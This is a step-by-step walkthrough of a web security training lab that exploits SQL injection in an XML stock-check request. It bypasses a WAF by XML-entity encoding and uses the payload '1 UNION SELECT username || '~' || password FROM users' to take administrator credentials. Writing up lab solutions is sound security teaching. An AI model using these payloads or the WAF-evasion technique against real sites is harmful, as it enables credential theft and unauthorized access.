# Lab Objective
Extract the usernames and passwords from the `users` table by:

1. Finding the SQL injection point.
2. Bypassing the WAF using XML entity encoding.
3. Determining the query structure.
4. Extracting credentials.
5. Logging in as the administrator.

# Step 1: Identify the Injection Point

Use the stock check feature.

Burp intercepts a request similar to:

```
POST /product/stock HTTP/2
Host: lab-id.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Notice that the request body is **XML**, not URL parameters.

---

# Step 2: Verify That Input Is Evaluated

Replace:

```xml
<storeId>1</storeId>
```

with

```xml
<storeId>1+1</storeId>
```

Send the request.

If the application now returns the stock for **Store 2**, it means the backend is evaluating the expression.

Conceptually:

Instead of treating:

```
1+1
```

as plain text,

the database evaluates it as:

```
2
```

This strongly suggests SQL injection.

---

<img width="1277" height="686" alt="Screenshot 2026-08-09 at 11 30 21 AM" src="https://github.com/user-attachments/assets/810b21b1-37b4-430d-8f1d-42a0784738f9" />

# Step 3: Test UNION Injection

Try:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Normally, this is how you would determine the number of columns.

However, the application responds with a message indicating the request has been blocked.

This means:

- the SQL injection point exists,
- but a WAF has detected the attack signature.

<img width="1277" height="685" alt="Screenshot 2026-08-09 at 11 31 34 AM" src="https://github.com/user-attachments/assets/ea57ffc1-a84e-48fc-bb03-bdcfe2ea6712" />


---

# Why Was It Blocked?

The WAF examines the incoming request before it reaches the SQL engine.

It likely detects keywords such as:

```
UNION
SELECT
```

and blocks the request.

---
# Install Hackvertor

```
Extensions > BAppstore > Search for Hackvertor > Install
```

# Step 4: Bypass the WAF

Because the request is XML, you can encode characters as **XML entities**.

Instead of sending the SQL keywords directly, encode them.

Hackvertor can do this automatically.

In Burp:

```
Highlight payload
        ↓
Right-click
        ↓
Extensions
        ↓
Hackvertor
        ↓
Encode
        ↓
hex_entities
```

or

```
dec_entities
```

<img width="1276" height="769" alt="Screenshot 2026-08-09 at 11 37 11 AM" src="https://github.com/user-attachments/assets/0ed3f004-20ff-4af0-a866-70cfb11c5f91" />


# Step 5: Determine the Number of Columns

Now repeat your UNION tests using the encoded payload.

Example:

```sql
1 UNION SELECT NULL
```

If it succeeds,

<img width="1278" height="686" alt="Screenshot 2026-08-09 at 11 38 14 AM" src="https://github.com/user-attachments/assets/d5d16798-d894-409c-b351-58232b1fa791" />


try:

```sql
1 UNION SELECT NULL,NULL
```

Suppose the application returns:

```
0 units
```

This indicates the query failed.

Therefore:

```
Original query
        │
        ▼
Returns ONE column
```

<img width="1276" height="677" alt="Screenshot 2026-08-09 at 11 39 48 AM" src="https://github.com/user-attachments/assets/79822b6a-e234-44d1-b9db-6e4ffafc2c53" />


---

# Step 6: Extract Data

Since only one column can be returned,

you must combine multiple values into one string.

The lab suggests:

```sql
username || '~' || password
```

---

## Why `||`?

In Oracle,

```sql
||
```

means:

```
String concatenation
```

Example:

```sql
'admin' || '~' || 'secret'
```

returns:

```
admin~secret
```

---

## Why `~`?

Without a separator:

```
administratorpassword123
```

would be difficult to split.

Instead:

```
administrator~password123
```

is easy to separate into:

- username
- password

---

# Step 7: Final Query

Conceptually, after XML entity encoding, the SQL becomes:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The database returns rows such as:

```
administrator~password123
carlos~mypassword
wiener~secret
```

Each row contains one combined value because the original query accepts only one column.

---

<img width="1275" height="645" alt="Screenshot 2026-08-09 at 11 41 28 AM" src="https://github.com/user-attachments/assets/6a6b7699-47f9-4a50-8eed-7379e8d2e40c" />


# Step 8: Read the Response

The stock check response now contains values similar to:

```
administrator~password123
```

Locate the administrator row and note the password.

---

# Step 9: Log In

Go to:

```
My Account
```

Log in using:

```
Username:
administrator

Password:
password123
```

(The actual password is unique to your lab.)

The lab is solved.

---

# Complete Workflow

```
XML Request
      │
      ▼
Modify storeId
      │
      ▼
Test arithmetic
(1+1)
      │
      ▼
SQL evaluation confirmed
      │
      ▼
Attempt UNION
      │
      ▼
Blocked by WAF
      │
      ▼
Encode payload as XML entities
      │
      ▼
WAF bypass
      │
      ▼
Determine column count
      │
      ▼
One column
      │
      ▼
Concatenate username/password
      │
      ▼
Extract credentials
      │
      ▼
Log in as administrator
```

# Key Concepts

### 1. SQL Injection in XML

The application uses XML input:

```xml
<storeId>1</storeId>
```

The value is inserted into a SQL query without proper sanitization, allowing SQL injection.

---

### 2. XML Entity Encoding

Characters can be represented as XML entities. The XML parser decodes these entities before SQL execution. If the WAF only inspects the raw XML, encoded payloads may evade its pattern matching.

---

### 3. WAF Bypass

Instead of sending obvious SQL keywords directly, encoding them in XML entities allows the request to pass the WAF while still being reconstructed into valid SQL by the XML parser.

---

### 4. Single-Column UNION

Because the original query returns only one column, the injected `UNION SELECT` must also return one column. Multiple values (username and password) are combined using Oracle's concatenation operator:

```sql
username || '~' || password
```

The `~` separator makes it easy to distinguish the username from the password in the response.
